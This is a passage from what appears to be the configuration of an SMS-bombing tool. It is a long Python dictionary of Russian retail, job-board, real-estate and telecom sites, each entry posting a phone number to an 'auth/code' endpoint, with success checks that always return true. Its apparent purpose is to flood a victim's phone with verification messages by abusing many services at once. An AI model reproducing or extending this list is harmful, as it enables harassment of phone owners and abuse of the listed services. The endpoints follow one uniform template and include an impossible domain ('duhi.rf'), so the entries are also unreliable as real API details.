        "url": "https://dixy.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dixy.ru/", "https://dixy.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api388": {
        "name": "MagnitRu",
        "url": "https://magnit.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://magnit.ru/", "https://magnit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api389": {
        "name": "PyaterochkaRu",
        "url": "https://5ka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://5ka.ru/", "https://5ka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api390": {
        "name": "PerekrestokRu",
        "url": "https://www.perekrestok.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.perekrestok.ru/", "https://www.perekrestok.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api391": {
        "name": "AшанRu",
        "url": "https://www.auchan.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.auchan.ru/", "https://www.auchan.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api392": {
        "name": "Verny",
        "url": "https://www.verny.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.verny.ru/", "https://www.verny.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api393": {
        "name": "Kirovsky",
        "url": "https://kirovsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kirovsky.ru/", "https://kirovsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api394": {
        "name": "Monetka",
        "url": "https://monetka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://monetka.ru/", "https://monetka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api395": {
        "name": "BристольRu",
        "url": "https://bristol.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bristol.ru/", "https://bristol.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api396": {
        "name": "KrasnoeBelyeRu",
        "url": "https://kras-bel.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kras-bel.ru/", "https://kras-bel.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api397": {
        "name": "FixPrice",
        "url": "https://fix-price.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fix-price.ru/", "https://fix-price.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api398": {
        "name": "Letual",
        "url": "https://www.letu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.letu.ru/", "https://www.letu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api399": {
        "name": "RiveGauche",
        "url": "https://rivegauche.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rivegauche.ru/", "https://rivegauche.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api400": {
        "name": "IleDeBeute",
        "url": "https://iledebeute.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://iledebeute.ru/", "https://iledebeute.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api401": {
        "name": "GoldApple",
        "url": "https://goldapple.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://goldapple.ru/", "https://goldapple.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api402": {
        "name": "Podrygka",
        "url": "https://www.podrygka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.podrygka.ru/", "https://www.podrygka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api403": {
        "name": "UлыбкаРадуги",
        "url": "https://r-ulybka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://r-ulybka.ru/", "https://r-ulybka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api404": {
        "name": "MagnitCosmetic",
        "url": "https://magnit.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://magnit.ru/", "https://magnit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api405": {
        "name": "Chistoly",
        "url": "https://chistoly.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chistoly.ru/", "https://chistoly.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api406": {
        "name": "Novex",
        "url": "https://novex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://novex.ru/", "https://novex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api407": {
        "name": "Splat",
        "url": "https://splat.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://splat.ru/", "https://splat.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api408": {
        "name": "NaturaSiberica",
        "url": "https://naturasiberica.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://naturasiberica.ru/", "https://naturasiberica.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api409": {
        "name": "YvesRocher",
        "url": "https://www.yves-rocher.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.yves-rocher.ru/", "https://www.yves-rocher.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api410": {
        "name": "LOccitane",
        "url": "https://loccitane.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://loccitane.ru/", "https://loccitane.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api411": {
        "name": "TheBodyShop",
        "url": "https://thebodyshop.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://thebodyshop.ru/", "https://thebodyshop.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api412": {
        "name": "Kiehls",
        "url": "https://kiehls.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kiehls.ru/", "https://kiehls.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api413": {
        "name": "Maccosmetics",
        "url": "https://maccosmetics.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://maccosmetics.ru/", "https://maccosmetics.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api414": {
        "name": "NYX",
        "url": "https://nyxcosmetic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nyxcosmetic.ru/", "https://nyxcosmetic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api415": {
        "name": "Sephora",
        "url": "https://sephora.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sephora.ru/", "https://sephora.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api416": {
        "name": "Randewoo",
        "url": "https://randewoo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://randewoo.ru/", "https://randewoo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api417": {
        "name": " ДухиРФ",
        "url": "https://duhi.rf/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://duhi.rf/", "https://duhi.rf", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api418": {
        "name": "AromaButik",
        "url": "https://aroma-butik.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://aroma-butik.ru/", "https://aroma-butik.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api419": {
        "name": "SpellSmell",
        "url": "https://spellsmell.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://spellsmell.ru/", "https://spellsmell.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api420": {
        "name": "Oozor",
        "url": "https://oozor.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://oozor.ru/", "https://oozor.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api421": {
        "name": "LiveMaster",
        "url": "https://www.livemaster.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.livemaster.ru/", "https://www.livemaster.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api422": {
        "name": "EtsyRu",
        "url": "https://etsy.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://etsy.ru/", "https://etsy.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api423": {
        "name": "AvitoRu",
        "url": "https://www.avito.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.avito.ru/", "https://www.avito.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api424": {
        "name": "YouDoRu",
        "url": "https://youdo.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://youdo.com/", "https://youdo.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api425": {
        "name": "ProfiRuAuth",
        "url": "https://profi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://profi.ru/", "https://profi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api426": {
        "name": "FlRuAuth",
        "url": "https://www.fl.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.fl.ru/", "https://www.fl.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api427": {
        "name": "KworkAuth",
        "url": "https://kwork.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kwork.ru/", "https://kwork.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api428": {
        "name": "HabrFreelanceAuth",
        "url": "https://freelance.habr.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://freelance.habr.com/", "https://freelance.habr.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api429": {
        "name": "WeblancerAuth",
        "url": "https://www.weblancer.net/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.weblancer.net/", "https://www.weblancer.net", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api430": {
        "name": "SuperJobAuth",
        "url": "https://www.superjob.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.superjob.ru/", "https://www.superjob.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api431": {
        "name": "HeadHunterAuth",
        "url": "https://hh.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hh.ru/", "https://hh.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api432": {
        "name": "RabotaRuAuth",
        "url": "https://www.rabota.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.rabota.ru/", "https://www.rabota.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api433": {
        "name": "GorodTrabov",
        "url": "https://www.gorodrabot.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.gorodrabot.ru/", "https://www.gorodrabot.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api434": {
        "name": "TrudVsem",
        "url": "https://trudvsem.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://trudvsem.ru/", "https://trudvsem.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api435": {
        "name": "JobRu",
        "url": "https://www.job.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.job.ru/", "https://www.job.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api436": {
        "name": "VacansyRu",
        "url": "https://vacancy.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vacancy.ru/", "https://vacancy.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api437": {
        "name": "RabotaSvoi",
        "url": "https://rabotasvoi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rabotasvoi.ru/", "https://rabotasvoi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api438": {
        "name": "VacanciesGazprom",
        "url": "https://gazprom-vacansy.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gazprom-vacansy.ru/", "https://gazprom-vacansy.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api439": {
        "name": "RosneftCareer",
        "url": "https://rosneft-career.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rosneft-career.ru/", "https://rosneft-career.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api440": {
        "name": "LukoilCareer",
        "url": "https://lukoil-career.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lukoil-career.ru/", "https://lukoil-career.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api441": {
        "name": "RZDannya",
        "url": "https://rzd-career.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rzd-career.ru/", "https://rzd-career.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api442": {
        "name": "RossetiCareer",
        "url": "https://rosseti-career.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rosseti-career.ru/", "https://rosseti-career.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api443": {
        "name": "SberCareer",
        "url": "https://sber-career.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sber-career.ru/", "https://sber-career.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api444": {
        "name": "VTBCareer",
        "url": "https://vtb-career.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vtb-career.ru/", "https://vtb-career.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api445": {
        "name": "AlfaCareer",
        "url": "https://alfabank.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://alfabank.ru/", "https://alfabank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api446": {
        "name": "TinkoffCareer",
        "url": "https://www.tinkoff.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.tinkoff.ru/", "https://www.tinkoff.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api447": {
        "name": "YandexCareer",
        "url": "https://yandex.ru/jobs/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yandex.ru/", "https://yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api448": {
        "name": "MailRuGroupCareer",
        "url": "https://corp.mail.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://corp.mail.ru/", "https://corp.mail.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api449": {
        "name": "VKCareer",
        "url": "https://vk.company/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vk.company/", "https://vk.company", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api450": {
        "name": "OzonCareer",
        "url": "https://ozon.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ozon.ru/", "https://ozon.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api451": {
        "name": "WildberriesCareer",
        "url": "https://wildberries.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://wildberries.ru/", "https://wildberries.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api452": {
        "name": "AvitoCareer",
        "url": "https://avito.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://avito.ru/", "https://avito.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api453": {
        "name": "LamodaCareer",
        "url": "https://lamoda.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lamoda.ru/", "https://lamoda.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api454": {
        "name": "MvideoCareer",
        "url": "https://mvideo.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mvideo.ru/", "https://mvideo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api455": {
        "name": "EldoradoCareer",
        "url": "https://eldorado.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://eldorado.ru/", "https://eldorado.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api456": {
        "name": "CitilinkCareer",
        "url": "https://citilink.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://citilink.ru/", "https://citilink.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api457": {
        "name": "DNS_Career",
        "url": "https://dns-shop.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dns-shop.ru/", "https://dns-shop.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api458": {
        "name": "MtsCareer",
        "url": "https://mts.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mts.ru/", "https://mts.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api459": {
        "name": "MegafonCareer",
        "url": "https://megafon.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://megafon.ru/", "https://megafon.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api460": {
        "name": "BeelineCareer",
        "url": "https://beeline.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://beeline.ru/", "https://beeline.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api461": {
        "name": "Tele2Career",
        "url": "https://tele2.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tele2.ru/", "https://tele2.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api462": {
        "name": "RostelecomCareer",
        "url": "https://rostelecom.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rostelecom.ru/", "https://rostelecom.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api463": {
        "name": "ErtelecomCareer",
        "url": "https://ertelecom.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ertelecom.ru/", "https://ertelecom.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api464": {
        "name": "NetByNetCareer",
        "url": "https://netbynet.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://netbynet.ru/", "https://netbynet.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api465": {
        "name": "AkadoCareer",
        "url": "https://akado.ru/career/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://akado.ru/", "https://akado.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api466": {
        "name": "GuardCareer",
        "url": "https://guard.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://guard.ru/", "https://guard.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api467": {
        "name": "SecurityCareer",
        "url": "https://security.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://security.ru/", "https://security.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api468": {
        "name": "AlphaGuard",
        "url": "https://alphaguard.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://alphaguard.ru/", "https://alphaguard.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api469": {
        "name": "BetaGuard",
        "url": "https://betaguard.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://betaguard.ru/", "https://betaguard.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api470": {
        "name": "GammaGuard",
        "url": "https://gammaguard.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gammaguard.ru/", "https://gammaguard.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api471": {
        "name": "DeltaSecurity",
        "url": "https://delta.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://delta.ru/", "https://delta.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api472": {
        "name": "CesarsSatellite",
        "url": "https://csat.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://csat.ru/", "https://csat.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api473": {
        "name": "Strazh",
        "url": "https://strazh.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://strazh.ru/", "https://strazh.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api474": {
        "name": "PolisGroup",
        "url": "https://polis-group.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://polis-group.ru/", "https://polis-group.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api475": {
        "name": "SetlGroup",
        "url": "https://setlgroup.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://setlgroup.ru/", "https://setlgroup.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api476": {
        "name": "PIK",
        "url": "https://pik.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pik.ru/", "https://pik.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api477": {
        "name": "LSR",
        "url": "https://lsr.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lsr.ru/", "https://lsr.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api478": {
        "name": "Etalon",
        "url": "https://etalon.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://etalon.ru/", "https://etalon.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api479": {
        "name": "A101",
        "url": "https://a101.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://a101.ru/", "https://a101.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api480": {
        "name": "Ingrad",
        "url": "https://ingrad.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ingrad.ru/", "https://ingrad.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api481": {
        "name": "Donstroy",
        "url": "https://donstroy.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://donstroy.ru/", "https://donstroy.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api482": {
        "name": "MRGroup",
        "url": "https://mr-group.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mr-group.ru/", "https://mr-group.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api483": {
        "name": "Sminex",
        "url": "https://sminex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sminex.ru/", "https://sminex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api484": {
        "name": "Vesper",
        "url": "https://vesper.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vesper.ru/", "https://vesper.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api485": {
        "name": "CapitalGroup",
        "url": "https://capitalgroup.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://capitalgroup.ru/", "https://capitalgroup.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api486": {
        "name": "ForteGroup",
        "url": "https://fortegroup.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fortegroup.ru/", "https://fortegroup.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api487": {
        "name": "LevelGroup",
        "url": "https://level.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://level.ru/", "https://level.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api488": {
        "name": "Самолет",
        "url": "https://samolet.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://samolet.ru/", "https://samolet.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api489": {
        "name": "ПИК-Комфорт",
        "url": "https://pik-comfort.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pik-comfort.ru/", "https://pik-comfort.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api490": {
        "name": "Жилсервис",
        "url": "https://zhilservis.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zhilservis.ru/", "https://zhilservis.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api491": {
        "name": "ДомРу",
        "url": "https://domru.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://domru.ru/", "https://domru.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api492": {
        "name": "ЭрТелеком",
        "url": "https://ertelecom.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ertelecom.ru/", "https://ertelecom.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api493": {
        "name": "Интерсвязь",
        "url": "https://is74.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://is74.ru/", "https://is74.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api494": {
        "name": "ТТК",
        "url": "https://my.ttk.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://my.ttk.ru/", "https://my.ttk.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api495": {
        "name": "МГТС",
        "url": "https://mgts.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mgts.ru/", "https://mgts.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api496": {
        "name": "Ростелеком",
        "url": "https://rostelecom.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rostelecom.ru/", "https://rostelecom.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api497": {
        "name": "БилайнИнтернет",
        "url": "https://beeline.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://beeline.ru/", "https://beeline.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api498": {
        "name": "МТСИнтернет",
        "url": "https://mts.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mts.ru/", "https://mts.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api499": {
        "name": "МегафонИнтернет",
